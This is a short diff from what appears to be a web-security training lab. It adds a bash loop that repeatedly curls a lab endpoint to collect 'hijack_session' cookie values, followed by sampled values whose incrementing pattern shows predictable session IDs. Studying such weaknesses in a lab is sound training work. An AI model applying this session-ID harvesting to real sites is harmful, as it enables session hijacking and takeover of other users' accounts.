@@ -1,0 +1,14 @@
+
+for i in {1..10}; do curl -s -I http://web0x01.hbtn/a1/hijack_session/ | awk '/hijack_session/ {print $2}'; done
+
+hijack_session=33ec378b-d561-4dd7-b3c-3367802-17687295522;
+hijack_session=33ec378b-d561-4dd7-b3c-3367803-17687295523;
+hijack_session=33ec378b-d561-4dd7-b3c-3367804-17687295524;
+hijack_session=33ec378b-d561-4dd7-b3c-3367805-17687295526;
+hijack_session=33ec378b-d561-4dd7-b3c-3367806-17687295527;
+hijack_session=33ec378b-d561-4dd7-b3c-3367808-17687295530;
+hijack_session=33ec378b-d561-4dd7-b3c-3367809-17687295531;
+hijack_session=33ec378b-d561-4dd7-b3c-3367810-17687295532;
+hijack_session=33ec378b-d561-4dd7-b3c-3367811-17687295534;
+hijack_session=33ec378b-d561-4dd7-b3c-3367812-17687295535;
+
